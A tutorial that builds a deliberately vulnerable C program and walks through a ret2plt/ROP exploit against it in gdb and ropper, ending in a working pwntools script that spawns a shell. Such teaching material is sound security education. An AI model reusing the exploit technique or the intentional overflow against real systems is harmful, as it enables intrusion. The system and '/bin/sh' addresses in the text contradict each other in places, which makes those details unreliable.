# Exploiting a buffer overflow, with NX and ASLR enabled - Tutorial

First let us write some code which is vulnerable to a buffer overflow attack:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc -fno-stack-protector -no-pie -o vuln ez_ret2plt.c

/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */
void shell() {
 system("/bin/sh");
 exit(0);
}

int main(int argc, char* argv[]) {
 int i=0;
 char buf[256];
 printf("Enter the string of destiny: \n");
 fgets(buf, 350, stdin);
 printf("%s\n",buf);
 return 0;
}

```
The function __fgets()__ reads 350 bytes from the input, even thought the buffer size is only 256 bytes.

Thus the buffer buf can be overflowed.
Our goal is to overwrite the return address, thus taking control over the program.


Getting started: Finding the offset to the return address
------------

First let us compile the c code to the binary __vuln__ (without stack canary and position independent execution (PIE)):

`gcc -fno-stack-protector -no-pie -o vuln ez_ret2plt.c`

we will have a look at the stack to find out the offset from the buffer to the return address.
Let's fire up gdb:
`gdb -q ./vuln`

Disassembling the __main__ function gives us:
```
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x000000000040116c <+0>:	push   rbp
   0x000000000040116d <+1>:	mov    rbp,rsp
   0x0000000000401170 <+4>:	sub    rsp,0x120
   0x0000000000401177 <+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x000000000040117d <+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x0000000000401184 <+24>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040118b <+31>:	lea    rdi,[rip+0xe7a]        # 0x40200c
   0x0000000000401192 <+38>:	call   0x401030 <puts@plt>
   0x0000000000401197 <+43>:	mov    rdx,QWORD PTR [rip+0x2eb2]        # 0x404050 <stdin@@GLIBC_2.2.5>
   0x000000000040119e <+50>:	lea    rax,[rbp-0x110]
   0x00000000004011a5 <+57>:	mov    esi,0x15e
   0x00000000004011aa <+62>:	mov    rdi,rax
   0x00000000004011ad <+65>:	call   0x401050 <fgets@plt>
   0x00000000004011b2 <+70>:	lea    rax,[rbp-0x110]
   0x00000000004011b9 <+77>:	mov    rdi,rax
   0x00000000004011bc <+80>:	call   0x401030 <puts@plt>
   0x00000000004011c1 <+85>:	mov    eax,0x0
   0x00000000004011c6 <+90>:	leave  
   0x00000000004011c7 <+91>:	ret    
End of assembler dump.

```
Let's set a breakpoint just before the function returns:
`b *main+90`
 Then we can run it using:
`r < <(python -c 'print("a"*100)')`
Examining the stack with:
`x/50xg $rsp`
displays 50 __giant words__ (8 bytes) beginning at the stack pointer.

```
0x7fffffffdf80:	0x00007fffffffe188	0x0000000100000000
0x7fffffffdf90:	0x6161616161616161	0x6161616161616161
0x7fffffffdfa0:	0x6161616161616161	0x6161616161616161
0x7fffffffdfb0:	0x6161616161616161	0x6161616161616161
0x7fffffffdfc0:	0x6161616161616161	0x6161616161616161
0x7fffffffdfd0:	0x6161616161616161	0x6161616161616161
0x7fffffffdfe0:	0x6161616161616161	0x6161616161616161
0x7fffffffdff0:	0x0000000a61616161	0x00007ffff7ffe730
0x7fffffffe000:	0x0000000000000000	0x0000000000000000
0x7fffffffe010:	0x0000000000000000	0x0000000000000000
0x7fffffffe020:	0x0000000000000000	0x0000000000000000
0x7fffffffe030:	0x0000000000000000	0x0000000000f0b5ff
0x7fffffffe040:	0x00000000000000c2	0x00007fffffffe076
0x7fffffffe050:	0x0000000000000001	0x00007ffff7e7ad25
0x7fffffffe060:	0x0000000000000000	0x0000000000401215
0x7fffffffe070:	0x00007ffff7fe44c0	0x0000000000000000
0x7fffffffe080:	0x00000000004011d0	0x0000000000401070
0x7fffffffe090:	0x00007fffffffe180	0x0000000000000000
0x7fffffffe0a0:	0x00000000004011d0	0x00007ffff7dfc09b
0x7fffffffe0b0:	0x0000000000000000	0x00007fffffffe188
0x7fffffffe0c0:	0x0000000100040000	0x000000000040116c
0x7fffffffe0d0:	0x0000000000000000	0x62279c3369691337
0x7fffffffe0e0:	0x0000000000401070	0x00007fffffffe180
0x7fffffffe0f0:	0x0000000000000000	0x0000000000000000
0x7fffffffe100:	0x9dd8634c8ba91337	0x9dd8730cca6f1337
```
We see that the buffer starts at address: 0x7fffffffdf90

Information about the current stack frame can be displayed by:
`i f`

Thus we receive information about the value of the return address as well as its location/address.
```
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffe0b0:
 rip = 0x4011c6 in main; saved rip = 0x7ffff7dfc09b
 called by frame at 0x7fffffffe170
 Arglist at 0x7fffffffe0a0, args: 
 Locals at 0x7fffffffe0a0, Previous frame's sp is 0x7fffffffe0b0
 Saved registers:
  rbp at 0x7fffffffe0a0, rip at 0x7fffffffe0a8
```
Now we can calculate the offset:
```
gdb-peda$ p 0x7fffffffe0a8 - 0x7fffffffdf90
$1 = 0x118
 ```
 Our __offset__ is 0x118 = 280
 
Performing a ret2plt attack
--------------------------------

Due to the randomization of the address space, we cannot perform a ret2libc attack.
We needed to guess the base address of the library which might take a huge amount of time.

Here we take a smarter approach. We return to procedure likage table which stays constant.
In the procedure linkage table there is a reference to each library function used in the code.
When you want to read more about the PLT, Global Offset Table and dynamic linking, I recommand [this blog post](https://sploitfun.blogspot.com/2013/06/dynamic-linking-internals.html)

All you need to know for now is that when the program needs to call a function from the libc library,
it calls the stub code in the PLT which then helps the linker to resolve the address of the global function.
I know this sounds complicated, but lets have a look at the disassebled shell function:
```
gdb-peda$ disassemble shell
Dump of assembler code for function shell:
   0x0000000000401152 <+0>:	push   rbp
   0x0000000000401153 <+1>:	mov    rbp,rsp
   0x0000000000401156 <+4>:	lea    rdi,[rip+0xea7]        # 0x402004
   0x000000000040115d <+11>:	call   0x401040 <system@plt>
   0x0000000000401162 <+16>:	mov    edi,0x0
   0x0000000000401167 <+21>:	call   0x401060 <exit@plt>
End of assembler dump.
```
Here we see that the program calls the system function in the plt secment, which is constant.
Thus we have our needed address of the system function: 0x402040

Now we know the address of the system function. This will help us to invoke the system function. 
Now we need the address of a pointer to the string "/bin/sh" to invoke a shell.

This can easily by done on gdb with peda plugin, doing the following:



These two addresses are needed to 
```
find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
vuln : 0x402004 --> 0x68732f6e69622f ('/bin/sh')
vuln : 0x403004 --> 0x68732f6e69622f ('/bin/sh')
libc : 0x7ffff7f59519 --> 0x68732f6e69622f ('/bin/sh')
```
As the libc address varies all the time, we pick one of the first two addresses: 0x403004

### To recap:

We now want to call the system function, and pass it the argument.

The first 6 arguments of a function in x86_64 as passed through registers.
How do we get the address of the pointer to /bin/sh in the _rdi_ register?

We use a little trick called Return-Oriented-Programming (ROP).
With the program called ropper, we can search for useful _Gadgets_ in the binary.
Because we want to write an address into the rdi register we search for instructions which are related to rdi register:

```
ropper --file vuln --search "% ?di"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % ?di

[INFO] File: vuln
0x000000000040108a: adc dword ptr [rax], eax; mov rdi, 0x40116c; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010fe: adc dword ptr [rax], edi; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004010bc: adc edi, dword ptr [rax]; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010be: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401100: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004010c0: add byte ptr [rax], al; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401102: add byte ptr [rax], al; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004010bb: je 0x10d0; mov eax, 0; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010c5: je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010fd: je 0x1110; mov eax, 0; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x0000000000401107: je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004011b3: lea eax, dword ptr [rbp - 0x110]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x00000000004011b2: lea rax, qword ptr [rbp - 0x110]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x00000000004010bd: mov eax, 0; test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x00000000004010ff: mov eax, 0; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x0000000000401087: mov ecx, 0x4011d0; mov rdi, 0x40116c; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108e: mov edi, 0x40116c; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010c7: mov edi, 0x404048; jmp rax; 
0x00000000004011ba: mov edi, eax; call 0x1030; mov eax, 0; leave; ret; 
0x0000000000401086: mov rcx, 0x4011d0; mov rdi, 0x40116c; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108d: mov rdi, 0x40116c; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004011b9: mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x00000000004010c6: or dword ptr [rdi + 0x404048], edi; jmp rax; 
0x000000000040122b: pop rdi; ret; 
0x00000000004010c3: test eax, eax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401105: test eax, eax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x00000000004010c2: test rax, rax; je 0x10d0; mov edi, 0x404048; jmp rax; 
0x0000000000401104: test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax;
```
At 0x40122b we see:  __pop rdi; ret;__. That is exactly what we need. Poping an address from the stack, writing it into the rdi register and then returning.

### Putting it all together

Out offset __0x118__, the ROP-Gadget: __0x40122b__ and the address of the pointer to "/bin/sh": __0x403004__ and the reference to the system function in the PLT: __0x401040__

Writing this as python code with pwntools:

```#!/usr/bin/env python
from pwn import *

system_addr = 0x401040
exit_addr = 0x401060
arg = 0x403004
pop_rdi  = 0x40122b

payload = ""
payload += "a"*0x118
payload += str(p64(pop_rdi))
payload += str(p64(arg))
payload += str(p64(system_addr))

#print(payload) for debug purposes

sh = process("./vuln")
print(sh.recv())
sh.sendline(payload)
sh.interactive()
```

I hope you enjoyed this tutorial, and happy pwning.
When you have questions, feel free to contact me: lormi090@gmail.com


